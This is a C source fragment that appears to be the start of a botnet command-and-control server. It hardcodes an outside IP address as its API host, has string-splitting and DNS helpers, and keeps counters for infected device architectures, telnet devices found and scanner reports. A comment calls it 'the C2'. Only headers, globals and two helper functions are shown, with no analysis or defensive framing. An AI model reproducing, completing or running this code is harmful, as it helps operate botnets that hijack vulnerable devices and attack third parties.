#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
///////////////////////////////////
#define APIHOST "23.94.22.102"
//////////////////////////////////
#define MXPRMS 10
int input_argc = 0;
///////////////////////////
char *input_argv[MXPRMS + 1] = { 0 };
void Split_Str(char *strr){
    int i = 0;
    for (i = 0; i < input_argc; i++)
        input_argv[i] = NULL;
    input_argc = 0;
    char *token = strtok(strr, " ");
    while (token != NULL && input_argc < MXPRMS){
        input_argv[input_argc++] = malloc(strlen(token) + 1);
        strcpy(input_argv[input_argc - 1], token);
        token = strtok(NULL, " ");
    }
}
///////////////////////////////////////////////
int resolvehttp(char * site , char* ip){
    struct hostent *he;
    struct in_addr **addr_list;
    int i;  
    if ( (he = gethostbyname( site ) ) == NULL){
        // get the host info
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;
    for(i = 0; addr_list[i] != NULL; i++){
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }
    return 1;
}
///////////////////////////////////////////////////////
unsigned int MIPS = 0;
unsigned int MIPSEL = 0;
unsigned int ARM4 = 0;
unsigned int ARM5 = 0;
unsigned int ARM6 = 0;
unsigned int ARM7 = 0;
unsigned int X86 = 0;
unsigned int PPC = 0;
unsigned int SUPERH = 0;
unsigned int SPARC = 0;
unsigned int M68K = 0;
unsigned int UNKNOWN = 0;
////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile FILE *ticket;
static volatile FILE *staff;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
//////////////////////
FILE *LogFile2;
FILE *LogFile3;
FILE *fff;

// I Put This Here Just To make The C2 Smaller